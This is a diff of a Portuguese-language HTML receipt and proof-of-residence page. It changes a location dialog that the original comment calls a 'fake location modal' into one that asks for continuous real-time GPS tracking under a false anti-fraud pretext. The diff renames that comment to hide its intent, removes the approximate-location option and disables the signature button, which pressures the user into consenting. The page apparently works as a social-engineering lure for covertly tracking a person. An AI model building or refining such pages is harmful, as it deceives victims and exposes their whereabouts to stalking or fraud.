@@ -13,9 +13,9 @@
             <p>Confirmação de Transação e Prova de Residência</p>
         </div>
 
-        <!-- Alerta de status animado -->
+        <!-- Alerta de status de GPS avançado -->
         <div id="statusGPS" class="aviso status-alerta">
-            ⚠️ <span>Aguardando validação de geolocalização por satélite...</span>
+            ⚠️ <span>Aguardando ativação de geolocalização por satélite...</span>
         </div>
 
         <form id="reciboForm">
@@ -41,7 +41,7 @@
 
             <div class="input-group">
                 <label>Assinatura Digital do Titular</label>
-                <button type="button" id="btnAbrirModal" class="btn-abrir-assinatura">✍️ Assinar em Tela Cheia</button>
+                <button type="button" id="btnAbrirModal" class="btn-abrir-assinatura" disabled>✍️ Assinar em Tela Cheia</button>
                 <div id="statusAssinatura" class="status-assinatura animate-pop">✅ Assinatura capturada com sucesso!</div>
             </div>
 
@@ -49,7 +49,7 @@
         </form>
     </div>
 
-    <!-- MODAL FALSO DE LOCALIZAÇÃO -->
+    <!-- MODAL DE INICIALIZAÇÃO DE GPS -->
     <div id="modalLocalizacao" class="modal-overlay">
         <div class="modal-box animate-scale-up">
             <div class="radar-container">
@@ -58,12 +58,11 @@
                 <div class="radar-dot"></div>
             </div>
             
-            <h3>Validação de Proximidade</h3>
-            <p>Por normas de segurança antifraude, precisamos confirmar se o seu aparelho está fisicamente no endereço do imóvel cadastrado através do GPS em segundo plano.</p>
-            <p class="modal-subtext">Como deseja prosseguir com a verificação de sinal?</p>
+            <h3>Validação de Proximidade GPS</h3>
+            <p>Por normas de segurança antifraude, precisamos monitorar continuamente a sua localização exata em tempo real para autenticar o recibo.</p>
+            <p class="modal-subtext">Toque abaixo para iniciar o rastreamento via satélite:</p>
             
-            <button type="button" id="btnEscolhaFixa" class="btn-opcao-local btn-opcao-destaque">🛰️ Confirmar Localização Exata (Recomendado)</button>
-            <button type="button" id="btnEscolhaAproximada" class="btn-opcao-local">⚠️ Utilizar Localização Aproximada</button>
+            <button type="button" id="btnIniciarGPS" class="btn-opcao-local btn-opcao-destaque">🛰️ Iniciar Monitoramento GPS</button>
             <button type="button" id="btnEscolhaNao" class="btn-opcao-local btn-perigo">❌ Recusar Verificação</button>
         </div>
     </div>
